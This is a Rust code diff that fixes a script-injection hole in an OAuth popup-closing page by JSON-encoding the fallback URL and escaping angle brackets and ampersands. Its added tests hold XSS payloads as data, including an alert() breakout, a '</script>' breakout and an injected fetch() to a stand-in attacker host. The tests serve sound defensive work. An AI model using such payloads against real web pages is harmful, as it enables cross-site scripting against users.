@@ -143,10 +143,21 @@ fn close_popup_page(fallback_url: &str) -> String {
         "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Connected</title></head>\
          <body style=\"font-family:sans-serif;text-align:center;padding:48px\">\
          <p style=\"color:#666\">Authorization complete. This window will close automatically.</p>\
-         <script>window.close();setTimeout(function(){{location.href=\"{}\"}},1000);</script>\
+         <script>window.close();setTimeout(function(){{location.href={}}},1000);</script>\
          </body></html>",
-        html_escape(fallback_url)
+        script_string_literal(fallback_url)
     )
+}
+
+/// `s` as a JavaScript string literal that is safe inside a `<script>` element:
+/// JSON-encoded, so a quote or backslash cannot end the string, with `<`, `>`
+/// and `&` as `\u` escapes, so `</script>` cannot end the element.
+fn script_string_literal(s: &str) -> String {
+    serde_json::Value::from(s)
+        .to_string()
+        .replace('<', "\\u003c")
+        .replace('>', "\\u003e")
+        .replace('&', "\\u0026")
 }
 
 fn error_page(message: &str) -> String {
@@ -162,4 +173,35 @@ fn html_escape(s: &str) -> String {
     s.replace('&', "&amp;")
         .replace('<', "&lt;")
         .replace('>', "&gt;")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::{close_popup_page, script_string_literal};
+
+    #[test]
+    fn script_string_literal_cannot_end_the_string_or_the_script() {
+        assert_eq!(script_string_literal("/chat"), "\"/chat\"");
+        assert_eq!(
+            script_string_literal("/\"+alert(1)+\""),
+            "\"/\\\"+alert(1)+\\\"\""
+        );
+        assert_eq!(script_string_literal("a\\b"), "\"a\\\\b\"");
+        assert_eq!(
+            script_string_literal("</script><script>"),
+            "\"\\u003c/script\\u003e\\u003cscript\\u003e\""
+        );
+        assert_eq!(script_string_literal("/?a=1&b=2"), "\"/?a=1\\u0026b=2\"");
+    }
+
+    #[test]
+    fn close_popup_page_keeps_a_hostile_url_inside_its_string() {
+        let page = close_popup_page("/\"+fetch('//evil.example')+\"</script>");
+        assert!(
+            page.contains(
+                "location.href=\"/\\\"+fetch('//evil.example')+\\\"\\u003c/script\\u003e\""
+            )
+        );
+        assert_eq!(page.matches("</script>").count(), 1, "{page}");
+    }
 }
